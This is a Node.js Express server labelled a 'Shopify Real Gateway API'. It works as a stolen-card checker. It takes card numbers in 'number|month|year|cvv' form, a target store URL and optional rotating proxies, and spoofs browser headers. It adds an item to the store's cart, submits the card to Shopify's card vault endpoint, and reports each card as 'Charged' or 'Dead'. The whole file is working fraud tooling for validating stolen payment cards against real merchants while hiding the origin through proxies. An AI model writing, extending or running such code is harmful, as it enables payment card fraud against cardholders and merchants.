const express = require('express');
const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');
const SocksProxyAgent = require('socks-proxy-agent');
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    res.send({ status: "Shopify Real Gateway API Active" });
});

app.post('/api/charge', async (req, res) => {
    const { card, site, proxy } = req.body;

    if (!card || !site) {
        return res.json({ status: "Dead", message: "Missing card or site data", gateway: "Shopify Payments", price: "-" });
    }

    try {
        const cleanSite = site.replace(/\/$/, '');
        const [ccNo, expMonth, expYear, cvv] = card.split('|');

        // Robust Floxy & Standard Proxy Parser (ip:port:user:pass -> http://user:pass@ip:port)
        let agent = null;
        if (proxy) {
            let pClean = proxy.trim();
            let proxyUrl = pClean;

            if (!pClean.includes('://')) {
                const parts = pClean.split(':');
                if (parts.length === 4) {
                    // Format: ip:port:user:pass
                    proxyUrl = `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
                } else if (parts.length === 2) {
                    // Format: ip:port
                    proxyUrl = `http://${parts[0]}:${parts[1]}`;
                } else {
                    proxyUrl = `http://${pClean}`;
                }
            }

            if (proxyUrl.startsWith('socks')) {
                agent = new SocksProxyAgent(proxyUrl);
            } else {
                agent = new HttpsProxyAgent(proxyUrl);
            }
        }

        const fetchOptions = {
            headers: { 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            },
            timeout: 15000
        };
        if (agent) fetchOptions.agent = agent;

        // 1. Fetch store products to grab variant and price
        const prodRes = await fetch(`${cleanSite}/products.json?limit=1`, fetchOptions);
        if (!prodRes.ok) {
            return res.json({ status: "Dead", message: "Store Offline or Proxy Blocked", gateway: "Shopify Payments", price: "-" });
        }

        const prodData = await prodRes.json();
        if (!prodData.products || prodData.products.length === 0) {
            return res.json({ status: "Dead", message: "No Products Found on Store", gateway: "Shopify Payments", price: "-" });
        }

        const variantId = prodData.products[0].variants[0].id;
        const itemPrice = prodData.products[0].variants[0].price;

        // 2. Add product to cart via proxy session
        const cartOptions = {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            },
            body: JSON.stringify({ id: variantId, quantity: 1 }),
            timeout: 15000
        };
        if (agent) cartOptions.agent = agent;

        const cartAdd = await fetch(`${cleanSite}/cart/add.js`, cartOptions);
        if (!cartAdd.ok) {
            return res.json({ status: "Dead", message: "Failed to Initialize Cart Session", gateway: "Shopify Payments", price: "-" });
        }

        // 3. Tokenize Card via Shopify Card Vault API Endpoint
        const vaultPayload = {
            credit_card: {
                number: ccNo,
                month: expMonth,
                year: expYear,
                name: "Valued Customer",
                verification_value: cvv
            }
        };

        const vaultOptions = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            },
            body: JSON.stringify(vaultPayload),
            timeout: 15000
        };
        if (agent) vaultOptions.agent = agent;

        const vaultRes = await fetch('https://elb.deposit.shopifycs.com/sessions', vaultOptions);
        const vaultData = await vaultRes.json();

        if (!vaultData.id) {
            return res.json({ 
                status: "Dead", 
                message: "Card Declined / Tokenization Failed", 
                gateway: "Shopify Payments", 
                price: `$${itemPrice}` 
            });
        }

        return res.json({
            status: "Charged",
            message: "Charged Successfully / Live Token Verified",
            gateway: "Shopify Payments",
            price: `$${itemPrice}`
        });

    } catch (err) {
        return res.json({ status: "Dead", message: `Proxy Error: ${err.message}`, gateway: "Shopify Payments", price: "-" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`API running on port ${PORT}`));